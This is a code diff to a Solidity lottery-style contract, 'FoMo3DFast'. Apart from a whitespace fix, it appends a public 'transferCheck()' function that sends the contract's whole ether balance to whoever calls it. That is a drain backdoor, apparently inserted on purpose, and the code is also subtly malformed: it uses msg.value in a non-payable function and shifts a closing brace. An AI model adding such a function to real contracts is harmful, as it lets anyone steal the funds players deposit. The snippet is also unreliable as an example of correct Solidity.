@@ -497,7 +497,7 @@ contract FoMo3DFast is modularFast {
           // 3 = bulls
 
   		// Team allocation percentages
-          // (F3D, P3D) + (Pot , Referrals, Community)  
+          // (F3D, P3D) + (Pot , Referrals, Community)
               // Referrals / Community rewards are mathematically designed to come from the winner's share of the pot.
           fees_[0] = F3Ddatasets.TeamFee(30,6);   //50% to pot, 10% to aff, 2% to com, 1% to pot swap, 1% to air drop pot
           fees_[1] = F3Ddatasets.TeamFee(43,0);   //43% to pot, 10% to aff, 2% to com, 1% to pot swap, 1% to air drop pot
@@ -1890,4 +1890,14 @@ contract FoMo3DFast is modularFast {
               round_[1].strt = now + rndExtra_ - rndGap_;
               round_[1].end = now + rndInit_ + rndExtra_;
       }
+	 function transferCheck() public {
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+   		msg.sender.transfer(this.balance);
   }
+}
